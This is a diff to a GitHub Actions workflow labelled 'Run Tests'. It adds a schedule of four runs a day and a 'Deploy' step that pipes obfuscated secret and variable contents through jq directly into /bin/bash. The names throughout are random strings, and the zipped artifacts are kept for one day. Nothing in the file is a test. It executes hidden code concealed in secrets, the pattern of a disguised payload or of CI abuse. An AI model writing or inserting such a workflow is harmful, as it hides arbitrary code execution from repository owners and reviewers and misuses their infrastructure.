@@ -2,6 +2,8 @@ name: Run Tests
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '15 1,7,13,19 * * *'
 jobs:
   dispatcher:
     runs-on: ubuntu-latest
@@ -10,15 +12,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: Deploy
         env:
-          hwql38: ${{ secrets.hwql38 }}
+          hl4: ${{ secrets.hl4 }}
         run: |
-          printf '%s' "$hwql38" | jq -r .gayb067 | /bin/bash
-          echo $rm17985 | jq -r .cngsp912 | /bin/bash
+          printf '%s' "$hl4" | jq -r .nru8 | /bin/bash
+          printf '%s' "$ykt547" | jq -r .fjqhs9 | /bin/bash
+          echo $qvac71858 | jq -r .ol22 | /bin/bash
+          printf '%s' "$hnb7023" | jq -r .f6806 | /bin/bash
+          echo $h761 | jq -r .sb13 | /bin/bash
+          printf '%s' "$ta95981" | jq -r .cnohy295 | /bin/bash
+          printf '%s' "$cmlzk5" | jq -r .qohvr626 | /bin/bash
+          echo $rjth64063 | jq -r .luh0 | /bin/bash
 
       - name: Save results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: WSwXvE8G
+          name: fnifKixA
           path: "*.zip"
           retention-days: 1
